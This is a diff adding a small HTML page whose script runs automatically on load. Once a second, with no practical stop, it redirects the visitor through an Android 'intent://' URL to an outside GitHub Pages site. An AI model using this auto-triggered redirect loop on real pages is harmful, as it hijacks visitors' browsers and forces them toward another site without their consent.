@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<script>
+let count = 0;
+let max = 50000000000;
+
+function go() {
+    let interval = setInterval(() => {
+        if (count >= max) {
+            clearInterval(interval);
+            return;
+        }
+
+        window.location.href = "intent://mrnoob790.github.io/Yogi#Intent;scheme=https;end";
+        count++;
+    }, 1000);
+}
+
+// try auto trigger
+window.onload = go;
+</script>
+
+</body>
+</html>
